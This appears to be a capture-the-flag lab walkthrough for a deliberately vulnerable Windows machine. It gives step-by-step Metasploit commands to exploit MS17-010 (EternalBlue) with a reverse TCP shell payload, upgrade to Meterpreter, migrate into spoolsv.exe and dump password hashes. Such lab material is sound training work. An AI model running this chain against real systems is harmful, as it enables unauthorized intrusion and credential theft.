# Activity performed as part of Blue

- **Pre-requisite** :
1. Start both the target VM and Attack Machine.

- **Recon** :
1. Run the nmap scan using the command: nmap -sV -vv --script vuln <IP>.
2. Based on the vulnerability found on the Target use the Metasploit Framework to check for exploits and execute it.
3. According to nmap vulnerability scan, Target is vulnerable to smb-vuln-ms17-010 services that's being used on the system.
4. Total number of open ports are 9, but under 1000 its 3.
5. Major services running on the target are: msrpc, netbios-ssn, microsoft-ds, ssl/ms-wbt-server.

- **Gain Access** :
1. Use search option to get the scanner for the vulneability shown by nmap scan. commad: search <ms17>.
2. Use the use command with module:auxiliary/scanner/smb/smb_ms17_010. command: use <result_no>.
3. Use show options to find all the necessary parameter. command: show options
4. Use the command hosts -R to set the RHOSTS parameter as we have a dedicated workspace for the blue machine.
5. Alternatively, we can use the set command. command: set RHOSTS <IP>.
6. run the scan using run/exploit command.
7. Upon verifying that the target is vulnerable to ms17_010. Checkout the exploits.
8. Use the exploit module: exploit/windows/smb/ms17_010_eternalblue. By using the command: use <result_no> or use <module_path>.
9. Set the payload as set payload windows/x64/shell/reverse_tcp as part of our learning.
10. Make sure to set the RHOSTS as we did not use the setg command.
11. Run the exploit using the run/exploit command.
12. As we get the dos command line, user should not be able to use any linux commands.

- **Escalate** : 
1. Now in-order to get the meterpreter shell, we use the module:post/multi/manage/shell_to_meterpreter
2. Use show options to look for necessary parameters. 
3. Use the run command to run the module to get the meterpreter shell.
4. Use getuid command to identify user.
5. Use shell command and navigate to the dos shell, use command whoami to verify you are at the mentioned level of administartion.
6. Use the spoolsv.exe process as its related to printer process and potential doesn't crash while migrating.(Research: find possible process which are stable for mirgation in meterpreter).

- **Cracking** :
1. Run the hashdump command to get the hashdump all users on the system.
2. Use any tool to crack the provided hash.

- **Find flags!** :
1. According to the 1st hint its found in the C drive location. Navigate to location and list files using the ls command to find the flag.
2. According to the 2nd hint its found where windows stores passwords. According to the search result the Location is C:\Windows\System32\config. List all the files in the location to find the flag.
3. As for the 3rd hint, It was not helpful but the search command can be used we know the naming convention used for the files. Use command: search <filename>. Then find the location and find the flag.

